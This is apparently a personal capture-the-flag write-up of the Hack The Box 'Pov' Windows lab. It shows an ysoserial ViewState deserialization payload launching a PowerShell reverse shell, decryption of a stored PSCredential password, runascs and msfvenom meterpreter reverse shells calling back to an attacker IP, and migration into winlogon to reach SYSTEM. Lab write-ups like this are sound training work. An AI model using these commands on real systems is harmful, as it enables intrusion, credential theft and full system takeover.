## Pov

### Lab Details 

- Difficulty: Medium
- Type: ASP.NET De-serialization, XML Decrypt,  Windows

#### Enumeration
- run `nmap`
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
```
- from the app 
	- found user: sfitz@pov.htb
	- found subdomain: `dev.pov.htb`
	- found we can download `CV.pdf` from `dev.pov.htb`
#### Initial Foothold 
- investigate the download request by intercepting the `download` request using `burpsuite`
```http
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
Content-Length: 357
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://dev.pov.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dev.pov.htb/portfolio/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=X1gGMHPbzSIiNZ4%2FAeDt5wWvHz8HhgryYWcBrWiWLjuvXvbDAgtTDcXcUVjThskLid7%2FVn3rg48pVI79ICEpjd7tH4M%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=8XDYBuO%2BYx9M2mz6hnCGEcogj1jr7asayRwr1sPS9xx0AHb9YmpL1j0NzMuTpLfXXdTT0qxiVqoOwpfc2BYlGgucF5JTu%2FqmVIgUoJLibN2tlDwwcAxLZOvTTFXgU%2BnzCgjKIw%3D%3D&file=cv.pdf
```
- we see that there's few `POST` request parameters been passed through that's specific for `ASP.NET`
- search for `asp.net vulnerable dopostback data parameters` online and found [this article](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
- `Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net`
- to use `ysoerial` we will need to install `wine`
```bash
$ wget https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip 

$ unzip ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip; cd Releases

$ winetricks dotnet48
```
- craft the payload using `ysoserial`
```bash
wine ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4A<SNIP>" --path="/portfolio" --apppath="/" --validationalg="SHA1" --validationkey=5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 --decryptionalg="AES" --decryptionkey=74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43
```
- inject the payload into `ViewState` in `Burpsuite Repeater`
![[burpsuite inject payload.png]]
- we get a reverse shell as `sfitz`
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.230.183] 49671

PS C:\windows\system32\inetsrv> whoami
pov\sfitz
```
#### Lateral Movement (If any)
- enumerate through the file system, found `connection.xml` in `~/Desktop`
- `connection.xml` contains password hash of user `alaading`
```powershell
PS C:\Users\sfitz\Documents> cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```
- we can use `Import-Clixml` to de-serialize the password
```bash
PS C:\Users\sfitz\Documents> $encryptedPassword = Import-Clixml -Path 'C:\Users\sfitz\Documents\connection.xml'
PS C:\Users\sfitz\Documents> $decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
PS C:\Users\sfitz\Documents> $decryptedPassword
```
- we get `aladding`'s credential
```
alaading:f8gQ8fynP44ek1m3
```
#### Privilege Escalation
- load `runascs.exe` to target and execute reverse shell as `alaading`
```powershell
.\runascs.exe alaading f8gQ8fynP44ek1m3 cmd -r 10.10.14.82:9000 
```
- check `whoami`
```powershell
$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.230.183] 49675
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
pov\alaading
```
- check for privilege and found user has `SeDebugPrivilege` enabled
```bash
PS C:\Users\alaading\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
- we can abuse this privilege by hijacking another process to gain root access
- tried hijacking `winlogon` with `psgetsys.ps1`  however i got `error code 122` which means the command buffer is exceeding the limit
```bash
PS C:\Users\alaading> ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c ping"
ImpersonateFromParentPid -ppid 552 -command "c:\windows\system32\cmd.exe" -cmdargs "/c ping"
[+] Got Handle for ppid: 552
[+] Updated proc attribute list
[+] Starting c:\windows\system32\cmd.exe /c ping...True - pid: 652 - Last error: 122
```
- going to use `msfconsole` instead
- first use `msfvenom` generate `meterpreter` reverse shell
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=9001 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```
- then load onto target
```bash
PS C:\Users\alaading> wget http://10.10.14.82:8000/rev.exe -O rev.exe
wget http://10.10.14.82:8000/rev.exe -O rev.exe
```
- set up the listener in `msfconsole`
```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) >> set lport 9001
lport => 9001
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.14.82:9001 
```
- run `rev.exe`
```bash
PS C:\Users\alaading> .\rev.exe 
.\rev.exe
```
- once we receive the connection we can migrate to `winlogon` and get `NT AUTHORITY\SYSTEM` access
```bash
<SNIP>
[*] Sending stage (203846 bytes) to 10.129.230.183
[*] Meterpreter session 1 opened (10.10.14.82:9001 -> 10.129.230.183:49692) at 2025-10-14 21:27:37 -0500
(Meterpreter 1)(C:\Users\alaading) > getuid
Server username: POV\alaading
(Meterpreter 1)(C:\Users\alaading) > ps winlogon
Filtering on 'winlogon'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 552  472   winlogon.exe  x64   1              C:\Windows\System32\winlogon.exe

(Meterpreter 1)(C:\Users\alaading) > migrate 552
[*] Migrating from 2956 to 552...
[*] Migration completed successfully.
(Meterpreter 1)(C:\Windows\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```
#### Resources

#### Lesson Learned
